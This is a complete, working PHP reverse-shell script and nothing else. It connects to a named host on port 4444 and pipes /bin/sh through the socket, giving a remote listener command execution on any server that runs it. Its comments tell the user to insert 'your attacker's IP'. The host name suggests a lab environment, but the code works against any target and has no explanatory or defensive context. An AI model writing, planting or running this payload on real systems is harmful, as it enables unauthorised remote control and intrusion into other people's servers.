<?php
$ip = "snf-6360.vlab.ac.ke"; // Change to your attacker's IP
$port = 4444; // Change to your listening port

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
